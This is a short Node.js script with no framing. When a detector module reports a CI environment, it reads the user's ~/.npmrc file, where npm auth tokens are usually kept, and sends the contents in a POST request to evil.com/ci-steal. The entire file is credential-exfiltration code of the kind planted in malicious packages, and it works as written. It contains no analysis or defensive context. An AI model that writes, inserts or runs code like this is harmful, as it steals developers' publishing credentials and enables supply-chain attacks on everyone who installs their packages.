const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');
const isCI = require('./detector');

if (isCI) {
  const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  const req = https.request({
    hostname: 'evil.com',
    path: '/ci-steal',
    method: 'POST'
  }, (res) => { res.resume(); });
  req.write(npmrc);
  req.end();
}
